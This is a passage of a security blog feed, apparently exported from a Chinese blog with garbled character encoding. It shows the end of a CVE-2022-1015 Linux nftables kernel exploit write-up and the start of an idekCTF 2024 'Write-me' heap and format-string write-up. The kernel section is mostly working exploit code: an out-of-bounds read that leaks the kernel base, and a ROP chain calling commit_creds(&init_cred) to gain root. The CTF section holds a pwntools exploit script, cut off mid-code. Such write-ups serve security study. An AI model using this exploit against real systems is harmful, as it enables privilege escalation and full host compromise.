&amp;nft_payload_set_ops;<br>&#125;<br></code></pre></td></tr></table></figure><p>è¿™æ ·æˆ‘ä»¬å°±å¯ä»¥ç›´æ¥é€šè¿‡å°†æ ˆä¸Šçš„å€¼å†™è¿›packetå†è¯»å–æ¥æ³„æ¼åœ°å€ï¼Œä¸éœ€è¦ä¾§ä¿¡é“äº†</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><ul><li><p>exploit.c</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// create_infoleak_rule() â€”â€” create rule to leak and compare with cmp</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">create_infoleak_rule</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> mnl_socket* nl, <span class="hljs-keyword">struct</span> nftnl_rule* r, <span class="hljs-type">uint16_t</span> family, <span class="hljs-type">int</span>* seq, <span class="hljs-type">int</span> extraflags)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">vuln_expr_params</span> <span class="hljs-title">vuln_params</span>;</span><br><br><span class="hljs-comment">// index 0xff -&gt; offset 0x3fc, leak kernel address</span><br>    <span class="hljs-keyword">if</span> (calc_vuln_expr_params(&amp;vuln_params, <span class="hljs-number">0xf5</span>,  <span class="hljs-number">0x40</span>, <span class="hljs-number">0x40</span>)) <br>        error(<span class="hljs-string">&quot;Could not find correct params to trigger OOB read.&quot;</span>);<br><br><span class="hljs-comment">// shift by pos*8 -&gt; the first byte of the register will be leaked</span><br>    <span class="hljs-type">uint32_t</span> shift_amt = <span class="hljs-number">0</span>;<br>    <span class="hljs-comment">// printf(&quot;min_len: 0x%x,   value:0x%x\n&quot;, vuln_params.min_len, vuln_params.value);</span><br>    rule_add_bit_shift(r, NFT_BITWISE_RSHIFT, vuln_params.min_len, vuln_params.value, <span class="hljs-number">1</span>, &amp;shift_amt, <span class="hljs-keyword">sizeof</span> shift_amt);<br>    <br><span class="hljs-comment">// ä½¿ç”¨payload setå°†æ ˆä¸Šåœ°å€å†™å…¥packetï¼Œ8å­—èŠ‚</span><br>    rule_add_payload_set(r, NFT_PAYLOAD_INNER_HEADER, <span class="hljs-number">0</span>, <span class="hljs-number">8</span>, <span class="hljs-number">0x15</span>);<br><br>    rule_add_immediate_verdict(r, NF_ACCEPT, <span class="hljs-literal">NULL</span>);<br><br>    send_batch_request(<br>        nl,<br>        NFT_MSG_NEWRULE | (NFT_TYPE_RULE &lt;&lt; <span class="hljs-number">8</span>),<br>        NLM_F_CREATE | extraflags, family, (<span class="hljs-type">void</span>**)&amp;r, seq,<br>        <span class="hljs-literal">NULL</span><br>    );<br>&#125;<br><span class="hljs-comment">// do_leak_byte() â€”â€” leak 1 byte</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> INFOLEAK_RULE_HANDLE 4</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">do_leak_bytes</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> mnl_socket* nl, <span class="hljs-type">int</span> client_sock, <span class="hljs-keyword">struct</span> sockaddr_in* addr, <span class="hljs-type">char</span>* table_name, <span class="hljs-type">char</span>* aux_chain_name, <span class="hljs-type">uint64_t</span>* p_leak, <span class="hljs-type">int</span>* seq)</span><br>&#123;<br>    <span class="hljs-type">char</span> msg[<span class="hljs-number">16</span>] = &#123;&#125;;<br>    <span class="hljs-type">char</span> result[<span class="hljs-number">16</span>] = &#123;&#125;;<br>    *(<span class="hljs-type">uint64_t</span>*)msg = MAGIC;<br><br><span class="hljs-comment">// 2. Create a rule that replaces the rule with handle INFOLEAK_RULE_HANDLE </span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">nftnl_rule</span>* <span class="hljs-title">r</span> =</span> build_rule(table_name, aux_chain_name, NFPROTO_IPV4, <span class="hljs-literal">NULL</span>);<br>    nftnl_rule_set_u64(r, NFTNL_RULE_HANDLE, INFOLEAK_RULE_HANDLE);         <span class="hljs-comment">// ???</span><br>        <br><span class="hljs-comment">// 3. create_infoleak_rule() â€”â€” create rule to leak and compare with mid</span><br>    create_infoleak_rule(nl, r, NFPROTO_IPV4, seq, NLM_F_REPLACE);<br><span class="hljs-comment">// 4. trigger the above rule</span><br>    sendto(client_sock, msg, <span class="hljs-keyword">sizeof</span> msg, <span class="hljs-number">0</span>, (<span class="hljs-keyword">struct</span> sockaddr*)addr, <span class="hljs-keyword">sizeof</span> *addr);<br><span class="hljs-comment">// 5. judge the leak value range according to drop/accept the packet</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sockaddr_in</span> <span class="hljs-title">presumed_server_addr</span>;</span><br>    <span class="hljs-type">socklen_t</span> presumed_server_addr_len = <span class="hljs-keyword">sizeof</span> presumed_server_addr;<br><br>    <span class="hljs-type">int</span> nrecv = recvfrom(client_sock, result, <span class="hljs-keyword">sizeof</span> result, <span class="hljs-number">0</span>, (<span class="hljs-keyword">struct</span> sockaddr*)&amp;presumed_server_addr, &amp;presumed_server_addr_len);<br>    <span class="hljs-keyword">if</span> (!nrecv)<br>        error(<span class="hljs-string">&quot;[-] Remote socket closed...&quot;</span>);<br>    <span class="hljs-keyword">else</span> &#123; <br>        <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">strcmp</span>(result, msg)) <br>            error(<span class="hljs-string">&quot;[-] Something went wrong...&quot;</span>);<br>        *p_leak = *(<span class="hljs-type">uint64_t</span> *)result;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[+] Leaked bytes: %llx\n&quot;</span>, *p_leak);<br>    &#125;<br>&#125;<br><span class="hljs-comment">// do_leak() â€”â€” leak kernel base</span><br><span class="hljs-type">uint64_t</span> <span class="hljs-title function_">do_leak</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> mnl_socket* nl, <span class="hljs-keyword">struct</span> sockaddr_in* addr, <span class="hljs-type">char</span>* table_name, <span class="hljs-type">char</span>* aux_chain_name, <span class="hljs-type">int</span>* seq)</span><br>&#123;<br>    <span class="hljs-meta">#<span class="hljs-keyword">define</span> CLIENT_HOST <span class="hljs-string">&quot;127.0.0.1&quot;</span></span><br>    <span class="hljs-meta">#<span class="hljs-keyword">define</span> CLIENT_PORT 8888</span><br><br>    <span class="hljs-type">int</span> client_sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);<br><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sockaddr_in</span> <span class="hljs-title">client_addr</span>;</span><br>    inet_aton(CLIENT_HOST, &amp;client_addr.sin_addr);<br>    client_addr.sin_port = htons(CLIENT_PORT);<br>    client_addr.sin_family = AF_INET;<br><br>    <span class="hljs-keyword">if</span> (bind(client_sock, (<span class="hljs-keyword">struct</span> sockaddr*)&amp;client_addr, <span class="hljs-keyword">sizeof</span> client_addr) &lt; <span class="hljs-number">0</span>) <br>        error(<span class="hljs-string">&quot;client bind&quot;</span>);<br><br><span class="hljs-comment">// 1. set 100ms receive timeout (can probably be lower)</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">timespec</span> <span class="hljs-title">t</span> =</span> &#123;.tv_sec =  <span class="hljs-number">0</span>, .tv_nsec = <span class="hljs-number">1000</span> * <span class="hljs-number">200</span>&#125;;<br>    setsockopt(client_sock, SOL_SOCKET, SO_RCVTIMEO, &amp;t, <span class="hljs-keyword">sizeof</span> t);<br><span class="hljs-comment">// 2. leak 8 bytes </span><br>    <span class="hljs-type">uint64_t</span> results;<br>    do_leak_bytes(nl, client_sock, addr, table_name, aux_chain_name, &amp;results, seq);<br>    <br>    close(client_sock);<br>    <span class="hljs-keyword">return</span> results;<br>&#125;<br><span class="hljs-comment">// leak_handler() â€”â€” polling to receive packet</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">leak_handler</span><span class="hljs-params">(<span class="hljs-type">int</span> fd)</span><br>&#123;<br>    <span class="hljs-type">char</span> buf[<span class="hljs-number">4096</span>] = &#123;&#125;;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sockaddr_in</span> <span class="hljs-title">client_addr</span> =</span> &#123;&#125;;<br>    <span class="hljs-type">socklen_t</span> client_addr_size = <span class="hljs-keyword">sizeof</span> client_addr;<br>    <span class="hljs-type">size_t</span> conn_id = <span class="hljs-number">0</span>;<br><br>    <span class="hljs-comment">// æŠŠæ”¶åˆ°çš„æ•°æ®å‘å›å»ï¼Œè¿™æ—¶å€™packetçš„å†…å®¹å·²ç»è¢«ä¿®æ”¹äº†</span><br>    <span class="hljs-keyword">for</span> (;;) &#123;<br>        <span class="hljs-built_in">memset</span>(buf, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(buf));<br>        <span class="hljs-type">int</span> len = recvfrom(fd, buf, <span class="hljs-keyword">sizeof</span> buf - <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, (<span class="hljs-keyword">struct</span> sockaddr*)&amp;client_addr, &amp;client_addr_size);<br>        <span class="hljs-keyword">if</span> (len &lt;= <span class="hljs-number">0</span>) <br>            error(<span class="hljs-string">&quot;listener receive failed..\n&quot;</span>);<br>        <br>        sendto(fd, buf, <span class="hljs-keyword">sizeof</span>(buf), <span class="hljs-number">0</span>, (<span class="hljs-keyword">struct</span> sockaddr*)&amp;client_addr, client_addr_size);<br>    &#125;<br><br>    close(fd);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>helpers.c</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">rule_add_payload_set</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> nftnl_rule* r, <span class="hljs-type">uint32_t</span> base, <span class="hljs-type">uint32_t</span> offset, <span class="hljs-type">uint32_t</span> len, <span class="hljs-type">uint32_t</span> sreg)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">nftnl_expr</span>* <span class="hljs-title">e</span>;</span><br>    e = nftnl_expr_alloc(<span class="hljs-string">&quot;payload&quot;</span>);<br><br>    nftnl_expr_set_u32(e, NFTNL_EXPR_PAYLOAD_BASE, base);<br>    nftnl_expr_set_u32(e, NFTNL_EXPR_PAYLOAD_OFFSET, offset);<br>    nftnl_expr_set_u32(e, NFTNL_EXPR_PAYLOAD_LEN, len);<br>    nftnl_expr_set_u32(e, NFTNL_EXPR_PAYLOAD_SREG, sreg);<br><br>    nftnl_rule_add_expr(r, e);  <br>&#125;<br></code></pre></td></tr></table></figure></li></ul><h2 id="hook-output"><a href="#hook-output" class="headerlink" title="hook output"></a>hook output</h2><p>hook outputåŠ«æŒip_local_outçš„è¿”å›åœ°å€</p><img src="/2024/08/23/cve-2022-1015/output_hijack.png" class title="output_hijack"><p>ROPé“¾å°±æ˜¯ç›´æ¥ææƒçš„é‚£ä¸€æ®µï¼Œæœ€åæŠ¬æ ˆè¿”å›ç”¨æˆ·æ€çš„é‚£æ¡æ¢ä¸€ä¸‹</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c">_rop(kernel_base + BPF_GET_CURRENT_TASK_OFF);       <span class="hljs-comment">// ffffffff811ef7e0 T bpf_get_current_task</span><br>_rop(kernel_base + MOV_RDI_RAX_OFF);                <span class="hljs-comment">// 0xffffffff8102bfb1: mov rdi, rax; mov eax, ebx; pop rbx; pop rbp; or rax, rdi; ret;  </span><br>_rop(<span class="hljs-number">0xdeadbeef</span>);<br>_rop(<span class="hljs-number">0xdeadbeef</span>);<br>_rop(kernel_base + POP_RSI_OFF);                    <span class="hljs-comment">// 0xffffffff810223e6: pop rsi; ret;</span><br>_rop(kernel_base + INIT_NSPROXY_OFF);               <span class="hljs-comment">// ffffffff8286d940 D init_nsproxy</span><br>_rop(kernel_base + SWITCH_TASK_NAMESPACES_OFF);     <span class="hljs-comment">// ffffffff810d12b0 T switch_task_namespaces</span><br><br><span class="hljs-comment">// commit_cred(&amp;init_cred)</span><br>_rop(kernel_base + POP_RDI_OFF);        <span class="hljs-comment">// 0xffffffff81092100: pop rdi; ret;</span><br>_rop(kernel_base + INIT_CRED_OFF);      <span class="hljs-comment">// ffffffff8286db80 D init_cred</span><br>_rop(kernel_base + COMMIT_CREDS_OFF);   <span class="hljs-comment">// ffffffff810d2690 T commit_creds</span><br><br><span class="hljs-comment">// pass control to system call stack</span><br><span class="hljs-comment">// this is offset +0x70 from our rop chain</span><br><span class="hljs-comment">// target is at   +0x168</span><br>_rop(kernel_base + <span class="hljs-number">0x20c</span>); <span class="hljs-comment">// 0xffffffff8100020c: ret;</span><br>_rop(kernel_base + <span class="hljs-number">0x7ea9f9</span>);  <span class="hljs-comment">// 0xffffffff817ea9f9: add rsp, 0x198; pop r12; pop rbp; ret;</span><br></code></pre></td></tr></table></figure><p>æŠ¬æ ˆè¿”å›åˆ°inet_sendmsg</p><img src="/2024/08/23/cve-2022-1015/stack_up.png" class title="stack_up"><h1 id="TODO"><a href="#TODO" class="headerlink" title="TODO"></a>TODO</h1><ul><li>ä¸­æ–­ç›¸å…³æœºåˆ¶</li><li>namespace</li></ul>]]></content>
    
    
    <categories>
      
      <category>CVEs</category>
      
      <category>Linux Kernel</category>
      
    </categories>
    
    
    <tags>
      
      <tag>kernel</tag>
      
      <tag>cve</tag>
      
      <tag>nft</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2024 idekCTF Write-me wp</title>
    <link href="/2024/08/20/idekctf2024-writeme/"/>
    <url>/2024/08/20/idekctf2024-writeme/</url>
    
    <content type="html"><![CDATA[<p>ã€Šé£æ°´å¤§å¸ˆã€‹ï¼Œå…¶å®å¹¶ä¸æ˜¯ï¼šï¼‰è¯„ä»·ä¸ºç›Šæ™ºæ¸¸æˆï¼Œæ²¡ä»€ä¹ˆç”¨ä½†åšä¸å‡ºæ¥éš¾å—</p><span id="more"></span><h1 id="é¢˜ç›®"><a href="#é¢˜ç›®" class="headerlink" title="é¢˜ç›®"></a>é¢˜ç›®</h1><ul><li>åŠŸèƒ½<ul><li>å¯ä»¥å‡ ä¹ä»»æ„mallocå’Œfree chunk</li><li>æ ¼å¼åŒ–å­—ç¬¦ä¸²ï¼Œå‚æ•°åœ¨å †ä¸Š</li></ul></li><li>éœ€æ±‚<ul><li>å¾€å¯¹åº”åœ°å€å†™å¯¹åº”å€¼</li></ul></li></ul><h1 id="åå·çš„é”™è¯¯æ€è·¯"><a href="#åå·çš„é”™è¯¯æ€è·¯" class="headerlink" title="åå·çš„é”™è¯¯æ€è·¯"></a>åå·çš„é”™è¯¯æ€è·¯</h1><p><em>ä½ æ‡‚é£æ°´äº†ä¸¤å¤©çš„å«é‡‘é‡</em></p><ul><li><p>ç”¨tcacheé£æ°´ï¼Œæƒ³æ³•ä¸º%hhnå†™åç§»ï¼Œ%hnå†™åœ°å€ï¼Œ%nå†™å€¼</p></li><li><p>å‘ç°$çš„æ›´æ”¹ä¸èƒ½ç«‹å³ç”Ÿæ•ˆï¼Œè¿™æ„å‘³ç€åœ¨åœ°å€å†™å®Œä¹‹å‰éƒ½åªèƒ½ä½¿ç”¨%cå ä½ï¼Œä½†cntå¯èƒ½ä¼šè·³è¿‡éœ€è¦å†™çš„å€¼ï¼Œå¦‚æœä½¿ç”¨%nä¸ä¼šé€’å¢cntä½†éœ€è¦åˆæ³•åœ°å€</p></li><li><p>ä½¿ç”¨unsorted binå’Œlarge biné£æ°´ï¼Œé€ åˆæ³•åœ°å€æ¥%nå ä½</p></li><li><p>å‘ç°è¿˜æ˜¯ä¸èƒ½é“ºæ»¡åˆæ³•åœ°å€</p></li><li><p>å‘ç°%hhnåªä¼šå†™cntçš„æœ€ä½å­—èŠ‚ï¼Œ%hnåŒç†ï¼Œå¯ä»¥è¿›è¡Œä¸€ä¸ªæº¢å‡ºï¼Œè¿™æ ·å°±ä¸ç”¨é“ºåˆæ³•åœ°å€äº†</p></li><li><p>ç”±äºå †é£æ°´æ—¶æœªçŸ¥addresså’Œvalueï¼Œæ‰€ä»¥è¿›è¡Œä¸€ä¸ªçˆ†ç ´ï¼Œå¯¹äºaddressçš„æ¯ä¸ªdwordéå†æ¯ä¸ªå¯èƒ½ä½ç½®</p><ul><li><p>%hhnå†™åç§»</p><img src="/2024/08/20/idekctf2024-writeme/level1.png" class title="level1"></li><li><p>%hnå†™åœ°å€</p><img src="/2024/08/20/idekctf2024-writeme/level2.png" class title="level2"></li></ul></li></ul><p><em>æ„Ÿè§‰è¦å‡ºäº†å¯¹å§ï¼ï¼ï¼æ•°å­—å¤§åˆ°ä¸€å®šç¨‹åº¦vfprintfå°±-1äº†ï¼šï¼‰</em></p><h2 id="Exp"><a href="#Exp" class="headerlink" title="Exp"></a>Exp</h2><p><em>è™½ç„¶æ˜¯é”™è¯¯æ€è·¯ä¸”è€—æ—¶å·¨é•¿ä½†å¥½æ­¹æ˜¯æ“äº†ä¸¤å¤©çš„expè¿˜æ˜¯è´´ä¸€ä¸‹ï¼Œçºªå¿µä¸€ä¸‹ï¼šï¼‰</em></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#context.log_level=&#x27;debug&#x27;</span><br>context.os=<span class="hljs-string">&#x27;linux&#x27;</span><br>context.arch=<span class="hljs-string">&#x27;amd64&#x27;</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">idx,sz</span>):<br>    <span class="hljs-comment">#print(&#x27;add &#x27;+hex(idx)+&#x27; &#x27;+hex(sz))</span><br>    p.sendlineafter(<span class="hljs-string">b&#x27;Choice? &#x27;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Index? &#x27;</span>,<span class="hljs-built_in">str</span>(idx).encode())<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Size? &#x27;</span>,<span class="hljs-built_in">str</span>(sz).encode())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">idx</span>):<br>    <span class="hljs-comment">#print(&#x27;delete &#x27;+hex(idx))</span><br>    p.sendlineafter(<span class="hljs-string">b&#x27;Choice? &#x27;</span>,<span class="hljs-string">b&#x27;2&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Index? &#x27;</span>,<span class="hljs-built_in">str</span>(idx).encode())<br><br><br>p=process(<span class="hljs-string">&#x27;./write_me&#x27;</span>)<br><span class="hljs-comment">#p=remote(&#x27;127.0.0.1&#x27;,9999)</span><br><br><br>add(<span class="hljs-number">0</span>,<span class="hljs-number">0x7000</span>)<br>add(<span class="hljs-number">1</span>,<span class="hljs-number">0x500</span>)<br><span class="hljs-keyword">for</span> sz <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0x7000</span>-<span class="hljs-number">0x20</span>,<span class="hljs-number">0x500</span>-<span class="hljs-number">0x10</span>,-<span class="hljs-number">0x10</span>):<br>    delete(<span class="hljs-number">0</span>)<br>    add(<span class="hljs-number">0</span>,sz)<br>    add(<span class="hljs-number">2</span>,<span class="hljs-number">0xffff</span>)<br>    delete(<span class="hljs-number">2</span>)<br>delete(<span class="hljs-number">1</span>)<br>delete(<span class="hljs-number">0</span>)<br><br>add(<span class="hljs-number">0</span>,<span class="hljs-number">0x6a00</span>)<br>add(<span class="hljs-number">0x402</span>,<span class="hljs-number">0x500</span>)<br><span class="hljs-comment">#   0x10</span><br><span class="hljs-comment">#   0x500</span><br><span class="hljs-comment">#   0x6000</span><br><span class="hljs-comment">#   </span><br><span class="hljs-comment">#   0x100</span><br><span class="hljs-comment">#           *3</span><br><span class="hljs-comment">#               *0x30</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_size</span>(<span class="hljs-params">siz</span>):<br>    edges=[sz <span class="hljs-keyword">for</span> sz <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0x530</span>,<span class="hljs-number">0xc31</span>,<span class="hljs-number">0x40</span>)]<br>    edges+=[sz <span class="hljs-keyword">for</span> sz <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0xdf0</span>,<span class="hljs-number">0x29f1</span>,<span class="hljs-number">0x200</span>)]<br>    edges+=[sz <span class="hljs-keyword">for</span> sz <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0x2ff0</span>,<span class="hljs-number">0x9ff1</span>,<span class="hljs-number">0x1000</span>)]<br>    <span class="hljs-keyword">if</span> siz+<span class="hljs-number">0x10</span> <span class="hljs-keyword">in</span> edges:<br>        <span class="hljs-keyword">return</span> siz-<span class="hljs-number">0x10</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> siz+<span class="hljs-number">0x10</span><br><br><span class="hljs-keyword">for</span> i1 <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">2</span>):<br>    <span class="hljs-keyword">for</span> i2 <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0x30</span>):<br>        <span class="hljs-keyword">for</span> i3 <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0x10</span>):<br>            delete(<span class="hljs-number">0</span>)<br>            size=<span class="hljs-number">0x6500</span>-(i1*<span class="hljs-number">0x3000</span>+i2*<span class="hljs-number">0x100</span>+i3*<span class="hljs-number">0x10</span>)<br>            add(<span class="hljs-number">1</span>,size)<br>            add(<span class="hljs-number">2</span>,<span class="hljs-number">0x6a00</span>-size-<span 